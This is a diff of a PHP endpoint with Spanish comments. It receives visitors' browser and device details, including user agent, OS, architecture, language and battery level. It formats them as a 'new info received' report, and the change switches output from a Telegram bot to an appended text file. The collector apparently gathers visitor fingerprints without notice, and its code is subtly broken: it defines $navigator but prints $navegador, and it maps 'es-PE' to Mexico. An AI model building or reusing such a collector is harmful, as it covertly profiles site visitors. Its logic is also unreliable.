@@ -1,18 +1,18 @@
-<?php
+<?php 
 require_once __DIR__ . '/config.php';
 require_once __DIR__ . '/telegram.php';
 
 // Recibir datos del frontend
-$user_agent = $_POST['agent'] ?? 'Desconocido';
-$navigator  = $_POST['navegador'] ?? 'N/A';
-$versionapp = $_POST['versionapp'] ?? 'N/A';
-$dystro     = $_POST['dystro'] ?? 'N/A';
-$lenguaje   = $_POST['idioma'] ?? 'N/A';
-$bateri     = $_POST['bateri'] ?? 'N/A';
+$user_agent = $_POST['agent'] ?? '';
+$navigator  = $_POST['navegador'] ?? '';
+$versionapp = $_POST['versionapp'] ?? '';
+$dystro     = $_POST['dystro'] ?? '';
+$lenguaje   = $_POST['idioma'] ?? '';
+$bateri     = $_POST['bateri'] ?? '';
 
 // Extraer Mobile
 preg_match('/\)([^)]*);([^;]*)$/', $user_agent, $mobileMatch);
-$mobile = $mobileMatch[1] ?? 'N/A';
+$mobile = $mobileMatch[1] ?? '';
 
 // Extraer Version
 preg_match('/;([^;]*)$/', $user_agent, $versionMatch);
@@ -29,33 +29,37 @@ if (stripos($dystro, 'armv7l') !== false) {
 } elseif (stripos($dystro, 'armv8l') !== false) {
     $arquitectura = 'arm 64bits';
 } else {
-    $arquitectura = 'N/A';
+    $arquitectura = '';
 }
 
 // Ajustar lenguaje y país
-if ($lenguaje === "es-MX") {
-    $lang_text = "Español/Mexicano";
+if ($lenguaje === "es-PE") {
+    $lang_text = "Español/Castellano";
     $pais = "Mexico";
 } else {
     $lang_text = $lenguaje;
-    $pais = "Desconocido";
+    $pais = "";
 }
 
-// Formatear mensaje para Telegram
-$msg = "📊 <b>Nueva info recibida</b>\n".
-       "📱 Mobile: $mobile\n".
-       "🌐 Navegador: $navegador\n".
-       "📦 Versión App: $version\n".
-       "💻 Sistema Operativo: $operativo\n".
-       "⚙ Arquitectura: $arquitectura\n".
-       "🗣 Idioma: $lang_text\n".
-       "🌎 País: $pais\n".
-       "🔋 Batería: $bateri%";
+// Formatear mensaje para Telegram con condicionales
+$msg = "📊 <b>Nueva info recibida</b>\n";
+
+if (!empty($mobile))       $msg .= "📱 Mobile: $mobile\n";
+if (!empty($navegador))    $msg .= "🌐 Navegador: $navegador\n";
+if (!empty($version))      $msg .= "📦 Versión App: $version\n";
+if (!empty($operativo))    $msg .= "💻 Sistema Operativo: $operativo\n";
+if (!empty($arquitectura)) $msg .= "⚙ Arquitectura: $arquitectura\n";
+if (!empty($lang_text))    $msg .= "🗣 Idioma: $lang_text\n";
+if (!empty($pais))         $msg .= "🌎 País: $pais\n";
+if (!empty($bateri))       $msg .= "🔋 Batería: $bateri%\n";
+
+// Guardar en archivo TXT (modo append)
+$file = __DIR__ . "/resultados.txt";
+file_put_contents($file, $msg . "\n----------------------\n", FILE_APPEND);
 
 // Enviar a Telegram
-send_to_telegram($msg);
+//send_to_telegram($msg);
 
 // Respuesta JSON
 echo json_encode(['status' => 'ok']);
 ?>
-
